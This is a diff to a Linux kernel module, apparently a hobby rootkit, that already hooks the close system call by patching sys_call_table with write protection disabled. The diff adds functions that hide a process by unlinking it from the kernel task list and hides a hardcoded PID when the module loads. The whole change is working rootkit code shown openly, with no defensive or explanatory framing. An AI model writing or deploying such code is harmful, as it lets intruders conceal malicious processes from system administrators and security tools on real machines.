@@ -1,7 +1,8 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/sched.h>
+#include <linux/sched/signal.h>
 #include <linux/unistd.h>
-#include "more_stuff.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Nathan Castets & Olivier Huge");
@@ -12,6 +13,8 @@ MODULE_DESCRIPTION("Fallen Dragon, Peter F. Hamilton");
 
 static void **sys_call_table;
 static void **ia32_sys_call_table;
+static struct task_struct *process, *prev_process, *next_process;
+static struct list_head *process_entry;
 
 asmlinkage long (*real_close)(struct pt_regs *);
 
@@ -86,7 +89,7 @@ static void hook_syscall(void) {
     printk(KERN_INFO "failed to hook syscall64, sys_call_table address is missing");
     return;
   }
-  
+
   write_cr0(read_cr0() & ~0x10000);
   real_close = sys_call_table[__NR_close];
   sys_call_table[__NR_close] = fake_close;
@@ -98,20 +101,58 @@ static void unhook_syscall(void) {
     printk(KERN_INFO "failed to reset syscall, sys_call_table address is missing");
     return;
   }
-  
+
   write_cr0(read_cr0() & ~0x10000);
   sys_call_table[__NR_close] = real_close;
   write_cr0(read_cr0() | 0x10000);
 }
 
+static void hide_process(pid_t process_pid) {
+  if (process) {
+    printk(KERN_INFO "a process is already hidden, maximum reached");
+    return;
+  }
+
+  for_each_process(process) {
+    if (process->pid != process_pid)
+      continue;
+
+    prev_process = list_entry(process->tasks.prev, struct task_struct, tasks);
+    next_process = list_entry(process->tasks.next, struct task_struct, tasks);
+
+    process_entry = prev_process->tasks.next;
+
+    prev_process->tasks.next = process->tasks.next;
+    next_process->tasks.prev = process->tasks.prev;
+
+    printk(KERN_INFO "process %d is now hidden", process->pid);
+    break;
+  }
+}
+
+static void unhide_process(void) {
+  if (!process) {
+    printk(KERN_INFO "no program is hidden");
+    return;
+  }
+
+  prev_process->tasks.next = process_entry;
+  next_process->tasks.prev = process_entry;
+
+  printk(KERN_INFO "process %d is now revealed", process->pid);
+  process = NULL;
+}
+
 int init_module(void) {
   printk(KERN_INFO "prime module started");
   search_sys_call_table();
-  hook_syscall();  
+  hook_syscall();
+  hide_process((pid_t)1621);
   return 0;
 }
 
 void cleanup_module(void) {
   unhook_syscall();
+  unhide_process();
   printk(KERN_INFO "prime module stopped");
 }
